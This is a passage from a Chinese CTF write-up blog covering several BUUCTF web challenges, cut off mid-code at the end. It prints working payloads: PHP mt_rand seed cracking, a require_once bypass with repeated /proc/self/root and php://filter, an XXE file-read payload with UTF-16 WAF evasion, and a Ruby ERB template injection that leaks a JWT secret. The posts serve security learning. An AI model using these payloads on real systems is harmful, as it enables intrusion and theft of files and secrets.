是个密码题？？？？</p><p>审计第一部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br></pre></td></tr></table></figure><p>我们需要知道用户名密码私钥 用户名是crispr已经给出 密码我们可以用万能钥匙去闭合 因此关键在于私钥</p><p><code> //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code>最后一句提示我们要通过公钥算出种子 再利用种子生成私钥</p><p>首先要爆破一下种子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="title function_ invoke__">len</span>(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=<span class="title function_ invoke__">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="title function_ invoke__">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">len</span>(str1)-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689045182635-356c24fb-2eef-4543-a0b8-69d47c40d71c.png" alt="img"></p><p>爆破得种子1775196155  并且下面的私钥要用5.2.1到7.0.x的版本去算 不然算出来不一样 </p><p>我一开始用php8算的一直算的和wp不一样 版本要正确才行</p><p>再来算私钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public:&quot;</span>.<span class="title function_ invoke__">public_key</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  private:&quot;</span>.<span class="title function_ invoke__">private_key</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到<code>XuNhoueCDCGc </code></p><p>访问<code>/login.html</code> 登录即可</p><h1 id="106、-极客大挑战-2020-Roamphp1-Welcome"><a href="#106、-极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="106、[极客大挑战 2020]Roamphp1-Welcome"></a>106、[极客大挑战 2020]Roamphp1-Welcome</h1><p>这题太抽象了</p><p>首先进去什么也没有，然后抓包显示405状态码</p><p> HTTP状态码 405 表示请求的方法不允许。它是在客户端发送的请求方法与服务器上所允许的方法不匹配时使用的状态码。  </p><p>所以默认是get 我们尝试抓包后改为post方式 爆出了源码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689144943353-7aeef221-d563-4b1f-a3f6-ce3aeaa1786e.png" alt="img"></p><p>很常见的套路 数组绕过就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roam1[]=1&amp;roam2[]=2</span><br></pre></td></tr></table></figure><p>然后可以看phpinfo</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689145004564-d20d1342-c322-450b-aa7f-c6e7959abc28.png" alt="img"></p><p>发现了<code>/f1444aagggg.php</code> 额。。但是访问啥也没有 然后就可以在这个phpinfo找到flag？？？</p><p>不懂为啥这题放在buu的第四页 </p><h1 id="107、-WMCTF2020-Make-PHP-Great-Again"><a href="#107、-WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="107、[WMCTF2020]Make PHP Great Again"></a>107、[WMCTF2020]Make PHP Great Again</h1><p>这道题目主要考察了require_once</p><p>他和require差不多 require_once 也会在包含文件时执行其中的代码并将其结果包含到主脚本中。区别在于，在包含相同文件时，require_once 会检查该文件是否已经被包含过，如果是，则不再重复包含，避免出现重复定义的错误。  </p><p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(‘flag.php’)，已经包含的文件不可以再require_once。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码中已经包含过了所以我们就无法再利用这个函数去包含flag文件</p><p>这里有个知识点</p><p><strong>require_once()在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过</strong>，外加伪协议编码一下： </p><p>然后关于&#x2F;proc&#x2F;self&#x2F;root </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146550618-3a5f2ae6-340b-42f9-b327-afe4657204bb.png" alt="img"></p><p>简单来说就是指向根目录的软链接 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146577763-dce5b8bf-979b-4f0e-8204-c5e26913b88d.png" alt="img"></p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure><p>这个我记得什么时候在ctfshow见过 反正又学到了</p><h1 id="108、-CSAWQual-2019-Web-Unagi"><a href="#108、-CSAWQual-2019-Web-Unagi" class="headerlink" title="108、[CSAWQual 2019]Web_Unagi"></a>108、[CSAWQual 2019]Web_Unagi</h1><p>这道题目目标还是很鲜明的 让我们上传文件 然后再把我们的内容展示出来 并且显示信息是xml格式的</p><p>所以我们可以上传xml文件进行xxe</p><p>一开始我上传的是:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE username [</span><br><span class="line">&lt;!ENTITY aaa SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt; ]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;aaa;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;&amp;aaa;&lt;/password&gt;</span><br><span class="line">&lt;name&gt;&amp;aaa;&lt;/name&gt;</span><br><span class="line">&lt;email&gt;&amp;aaa;&lt;/email&gt;</span><br><span class="line">&lt;group&gt;&amp;aaa;&lt;/group&gt;</span><br><span class="line">&lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br></pre></td></tr></table></figure><p>但是无论我去掉flag system都是被waf了 看了wp才明白可以用其他编码绕过</p><p>在kali <code>iconv -f utf8 -t utf16 1.xml&gt;2.xml</code></p><p>iconv 是一个在 Linux 和 Unix 系统上常用的字符编码转换工具。它可以将一个字符集的文本转换为另一个字符集的文本。  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149395750-95a55a53-b147-4d9c-86e3-e1c4b5782c95.png" alt="img"></p><p>这里有个坑就是在xml文件中一定要包括他本来就存在的<code>&lt;intro&gt;&amp;xxe;&lt;/intro&gt;</code>这个标签 不然其他标签回显flag不完整都是一般 只有在这个回显的完整的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149481560-7cacba81-1c98-408b-b818-fcafa4800307.png" alt="img"></p><h1 id="109、-SCTF2019-Flag-Shop"><a href="#109、-SCTF2019-Flag-Shop" class="headerlink" title="109、[SCTF2019]Flag Shop"></a>109、[SCTF2019]Flag Shop</h1><p>买flag 一眼丁真</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689155122030-02f4658e-9dee-4cad-9574-9990289024e7.png" alt="img"></p><p>就是伪造类似于session之类的去修改自己的钱数 然后再去买flag</p><p>但是需要key 抓个包 发现感觉是jwt</p><p>然后访问&#x2F;robots.txt 爆出源码</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, <span class="title class_">File</span>.dirname(<span class="variable constant_">__FILE__</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">FLAGPRICE</span> = <span class="number">1000000000000000000000000000</span></span><br><span class="line"><span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] = <span class="title class_">SecureRandom</span>.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = <span class="title class_">File</span>.new(<span class="title class_">File</span>.dirname(<span class="variable constant_">__FILE__</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use <span class="title class_">Rack</span><span class="symbol">:</span><span class="symbol">:CommonLogger</span>, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb <span class="variable constant_">IO</span>.binread <span class="variable constant_">__FILE__</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> <span class="title class_">SecureRandom</span>.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.encode payload,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + <span class="title class_">SecureRandom</span>.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    <span class="variable constant_">ERB</span><span class="symbol">:</span><span class="symbol">:new</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; <span class="variable constant_">FLAGPRICE</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">islogin</span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>这是用ruby写的 虽然不懂语言 但是大致能明白干了个啥</p><p>还真是 jwt  看了一下key的生成 <code>ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</code>这肯定我们无法伪造 然后就没思路了</p><p>看了wp 发现涉及ERB模板注入</p><p>ERB模板注入格式是<code>&lt;%=其他%&gt;</code></p><p>直接来看怎样获取flag</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + <span class="title class_">SecureRandom</span>.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    <span class="variable constant_">ERB</span><span class="symbol">:</span><span class="symbol">:new</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><code>params[:变量名]</code>这里应该就是get请求名 虽然不太懂ruby 但是大致能猜出</p><p><code>params[:name][0,7]</code>我们输入的name不能超过7个字符</p><p>前面说到我们只能输入7个字符的name 除去模板注入的<code>&lt;%=%&gt;</code>已经占据了五个字符 我们能控制的只有两个了</p><p>这里需要用到Ruby语言的一个特性 我们可以利用<code>$&#39;</code>来返回正则匹配结果的右边  </p><ul><li><code>$&#39;</code> 最后一次模式匹配中匹配部分之后的字符串</li></ul><p>比如<code>hello world </code>设置匹配e 那么就会返回<code>llo world</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">  puts <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]</span><br></pre></td></tr></table></figure><p>这里就是在用环境中secret与我们输入的secret进行匹配 如果我们输入secret为空</p><p>那么<code>$&#39;</code>就会帮我们完整的值输出</p><p>所以payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/work?SECRET=&amp;name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt; is working</span><br></pre></td></tr></table></figure><p>避免歧义进行url编码后打入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/work?SECRET=&amp;name=%3C%25%3D$&#x27;%25%3E&amp;do=%3C%25%3D$&#x27;%25%3E%20is%20working </span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156469993-1fe293bf-0731-4bb9-afa1-1baea4c66837.png" alt="img"></p><p>得到了key 然后jwt伪造 打入抓包 再解码就可以得到flag了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156517393-2b00eb8d-8b8f-483c-bd18-6283d478d58c.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156526111-41289877-d5fe-43b4-995b-8a5c3c2fe4c0.png" alt="img"></p><h1 id="110、-GYCTF2020-Easyphp"><a href="#110、-GYCTF2020-Easyphp" class="headerlink" title="110、[GYCTF2020]Easyphp"></a>110、[GYCTF2020]Easyphp</h1><p>代码审计先放着 太抽象了 大概看了一下涉及反序列化字符串逃逸 sql注入等等 之后再来填坑把。</p><h1 id="111、-极客大挑战-2020-Greatphp"><a href="#111、-极客大挑战-2020-Greatphp" class="headerlink" title="111、[极客大挑战 2020]Greatphp"></a>111、[极客大挑战 2020]Greatphp</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span 